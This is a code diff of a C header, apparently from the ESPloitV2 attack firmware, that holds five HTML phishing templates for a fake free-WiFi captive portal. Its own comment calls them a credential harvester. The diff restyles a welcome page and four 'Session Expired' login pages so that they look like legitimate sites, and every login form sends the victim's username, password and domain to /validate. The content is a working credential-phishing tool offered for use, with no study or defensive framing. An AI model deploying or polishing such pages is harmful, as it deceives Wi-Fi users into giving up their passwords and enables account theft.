@@ -1,94 +1,239 @@
+/*
+ * spoof_page.h - ESPortal credential harvester templates for ESPloitV2
+ *
+ * Defines 5 PROGMEM HTML templates served by the captive-portal web server:
+ *   PORTAL_LOGIN_HTML  - Welcome/landing page shown on captive-portal connect
+ *   SITE_OTHER_HTML    - Catch-all generic login page for unmatched domains
+ *   SITE1_HTML         - Branded spoof login (amber theme)
+ *   SITE2_HTML         - Branded spoof login (cyan theme)
+ *   SITE3_HTML         - Branded spoof login (purple theme)
+ *
+ * Each login template uses self-contained inline CSS (NOT /style.css) so
+ * pages render correctly as standalone captive-portal responses and look
+ * like legitimate sites without external asset dependencies.
+ *
+ * All login forms POST credentials via GET to /validate with fields:
+ *   user  - username / email input
+ *   pass  - password input
+ *   url   - hidden field, auto-filled via JS with document.domain
+ *
+ * Templates can be overridden by uploading custom HTML files via FTP:
+ *   welcome.html, spoof_other.html, spoof_site1.html,
+ *   spoof_site2.html, spoof_site3.html
+ *
+ * Visual themes:
+ *   PORTAL = teal gradient    OTHER = dark
+ *   SITE1  = amber            SITE2 = cyan    SITE3 = purple
+ */
+
 const char PORTAL_LOGIN_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
-<html>
-<body bgcolor="black" text="white">
-<center><h1>
-Welcome to our Free Wifi!
-</h1>
-<img width='86' height='86' src='data:image/png;base64,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'>
-<br>
-<small>Your security is important to us...</small>
-</center>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Free WiFi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:rgba(255,255,255,.06);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:48px 40px;max-width:400px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.3)}
+.icon{margin-bottom:24px}
+.icon svg{width:72px;height:72px;fill:none;stroke:#4fc3f7;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+h1{font-size:1.5em;font-weight:700;margin-bottom:8px;color:#fff}
+.sub{font-size:.95em;color:#90a4ae;margin-bottom:24px;line-height:1.5}
+.divider{border:none;border-top:1px solid rgba(255,255,255,.08);margin:24px 0}
+.tagline{font-size:.8em;color:#607d8b;letter-spacing:.5px}
+</style>
+</head>
 <body>
+<div class="card">
+<div class="icon">
+<svg viewBox="0 0 64 64"><path d="M32 52a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" fill="#4fc3f7" stroke="none"/><path d="M22 40a14.1 14.1 0 0 1 20 0"/><path d="M14 32a25.2 25.2 0 0 1 36 0"/><path d="M6 24a36.3 36.3 0 0 1 52 0"/></svg>
+</div>
+<h1>Welcome to Free WiFi</h1>
+<p class="sub">You are now connected to the network.<br>Enjoy your browsing experience.</p>
+<hr class="divider">
+<p class="tagline">Your security is important to us...</p>
+</div>
+</body>
 </html>
 )=====";
 
 
 const char SITE_OTHER_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
-<html>
-<body bgcolor="black" text="white">
-<center><h1>
-Session at 
-<script>
-document.write(document.domain);
-</script>
- Expired<br><br>Please login again.</h1></center><center>
-</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input value="Log-In" type="submit"></form>
-<script>
-document.getElementById("isURL").value=document.domain;
-</script>
-</center>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Session Expired</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.lock{text-align:center;margin-bottom:20px;font-size:2em;opacity:.7}
+h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#e6edf3}
+.domain{text-align:center;font-size:.85em;color:#f0883e;margin-bottom:24px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.8em;font-weight:500;color:#8b949e;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:.95em;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#58a6ff}
+.btn{width:100%;padding:10px;background:#238636;border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s}
+.btn:hover{background:#2ea043}
+.note{text-align:center;font-size:.75em;color:#484f58;margin-top:16px}
+</style>
+</head>
 <body>
+<div class="card">
+<div class="lock">&#128274;</div>
+<h1>Session Expired</h1>
+<p class="domain">Session at <script>document.write(document.domain);</script> has timed out</p>
+<form method="get" action="/validate">
+<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter your username" autocomplete="username"></div>
+<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter your password" autocomplete="current-password"></div>
+<input type="hidden" id="isURL" name="url" value="">
+<input class="btn" type="submit" value="Sign In">
+</form>
+<p class="note">Please re-authenticate to continue your session.</p>
+</div>
+<script>document.getElementById("isURL").value=document.domain;</script>
+</body>
 </html>
 )=====";
 
 
 const char SITE1_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
-<html>
-<body bgcolor="orange" text="white">
-<center><h1>
-Session at 
-<script>
-document.write(document.domain);
-</script>
- Expired<br><br>Please login again.</h1></center><center>
-</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:white;background-color:blue" value="Log-In" type="submit"></form>
-<script>
-document.getElementById("isURL").value=document.domain;
-</script>
-</center>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#1e293b;border:1px solid rgba(234,179,8,.15);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.accent{height:4px;background:linear-gradient(90deg,#f59e0b,#eab308);border-radius:4px 4px 0 0;margin:-40px -36px 28px;border-radius:12px 12px 0 0}
+.icon{text-align:center;margin-bottom:16px}
+.icon svg{width:40px;height:40px;fill:none;stroke:#f59e0b;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f8fafc}
+.domain{text-align:center;font-size:.85em;color:#f59e0b;margin-bottom:24px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.8em;font-weight:500;color:#94a3b8;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:.95em;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#f59e0b}
+.btn{width:100%;padding:10px;background:linear-gradient(135deg,#f59e0b,#d97706);border:none;border-radius:8px;color:#1a1a2e;font-size:.9em;font-weight:700;cursor:pointer;margin-top:8px;transition:opacity .2s}
+.btn:hover{opacity:.9}
+.note{text-align:center;font-size:.75em;color:#475569;margin-top:16px}
+</style>
+</head>
 <body>
+<div class="card">
+<div class="accent"></div>
+<div class="icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
+<h1>Session Expired</h1>
+<p class="domain"><script>document.write(document.domain);</script></p>
+<form method="get" action="/validate">
+<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter username" autocomplete="username"></div>
+<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter password" autocomplete="current-password"></div>
+<input type="hidden" id="isURL" name="url" value="">
+<input class="btn" type="submit" value="Sign In">
+</form>
+<p class="note">Your session has expired. Please log in again.</p>
+</div>
+<script>document.getElementById("isURL").value=document.domain;</script>
+</body>
 </html>
 )=====";
 
 
 const char SITE2_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
-<html>
-<body bgcolor="blue" text="white">
-<center><h1>
-Session at 
-<script>
-document.write(document.domain);
-</script>
- Expired<br><br>Please login again.</h1></center><center>
-</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:black;background-color:white" value="Log-In" type="submit"></form>
-<script>
-document.getElementById("isURL").value=document.domain;
-</script>
-</center>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(160deg,#0f172a,#1e3a5f);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:rgba(30,58,95,.6);backdrop-filter:blur(8px);border:1px solid rgba(56,189,248,.12);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.top{text-align:center;margin-bottom:24px}
+.top svg{width:44px;height:44px;fill:none;stroke:#38bdf8;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f0f9ff}
+.domain{text-align:center;font-size:.85em;color:#38bdf8;margin-bottom:24px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.8em;font-weight:500;color:#7dd3fc;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:rgba(15,23,42,.7);border:1px solid rgba(56,189,248,.2);border-radius:8px;color:#e0f2fe;font-size:.95em;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#38bdf8}
+.btn{width:100%;padding:10px;background:linear-gradient(135deg,#0284c7,#0369a1);border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
+.btn:hover{opacity:.9}
+.divider{display:flex;align-items:center;gap:12px;margin:20px 0 16px;font-size:.75em;color:#475569}
+.divider::before,.divider::after{content:"";flex:1;border-top:1px solid rgba(56,189,248,.1)}
+.note{text-align:center;font-size:.75em;color:#475569;margin-top:12px}
+</style>
+</head>
 <body>
+<div class="card">
+<div class="top"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg></div>
+<h1>Session Timed Out</h1>
+<p class="domain"><script>document.write(document.domain);</script></p>
+<div class="divider">re-authenticate to continue</div>
+<form method="get" action="/validate">
+<div class="field"><label>Username</label><input type="text" name="user" placeholder="Your username" autocomplete="username"></div>
+<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Your password" autocomplete="current-password"></div>
+<input type="hidden" id="isURL" name="url" value="">
+<input class="btn" type="submit" value="Continue">
+</form>
+<p class="note">Secure connection verified.</p>
+</div>
+<script>document.getElementById("isURL").value=document.domain;</script>
+</body>
 </html>
 )=====";
 
 
 const char SITE3_HTML[] PROGMEM = R"=====(
 <!DOCTYPE html>
-<html>
-<body bgcolor="purple" text="white">
-<center><h1>
-Session at 
-<script>
-document.write(document.domain);
-</script>
- Expired<br><br>Please login again.</h1></center><center>
-</p><form method="get" action="/validate"><label>USERNAME: </label><input type="text" name="user" length=64><br><label>PASSWORD: </label><input type="password" name="pass" length=64><input type="hidden" id="isURL" name="url" value="" /><br><br><input style="color:white;background-color:blue" value="Log-In" type="submit"></form>
-<script>
-document.getElementById("isURL").value=document.domain;
-</script>
-</center>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(160deg,#1a0a2e,#2d1b4e);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:rgba(45,27,78,.6);backdrop-filter:blur(8px);border:1px solid rgba(168,85,247,.15);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.top{text-align:center;margin-bottom:24px}
+.top svg{width:44px;height:44px;fill:none;stroke:#a855f7;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f5f3ff}
+.domain{text-align:center;font-size:.85em;color:#a855f7;margin-bottom:24px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:.8em;font-weight:500;color:#c4b5fd;margin-bottom:6px}
+.field input{width:100%;padding:10px 14px;background:rgba(26,10,46,.7);border:1px solid rgba(168,85,247,.2);border-radius:8px;color:#ede9fe;font-size:.95em;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#a855f7}
+.btn{width:100%;padding:10px;background:linear-gradient(135deg,#9333ea,#7c3aed);border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
+.btn:hover{opacity:.9}
+.badge{text-align:center;margin-bottom:20px}
+.badge span{display:inline-block;padding:3px 12px;background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.2);border-radius:20px;font-size:.72em;color:#c4b5fd;letter-spacing:.5px;text-transform:uppercase}
+.note{text-align:center;font-size:.75em;color:#4c3a6e;margin-top:16px}
+</style>
+</head>
 <body>
+<div class="card">
+<div class="top"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+<div class="badge"><span>Session Expired</span></div>
+<h1>Verification Required</h1>
+<p class="domain"><script>document.write(document.domain);</script></p>
+<form method="get" action="/validate">
+<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter username" autocomplete="username"></div>
+<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter password" autocomplete="current-password"></div>
+<input type="hidden" id="isURL" name="url" value="">
+<input class="btn" type="submit" value="Verify & Continue">
+</form>
+<p class="note">Protected by secure authentication.</p>
+</div>
+<script>document.getElementById("isURL").value=document.domain;</script>
+</body>
 </html>
 )=====";
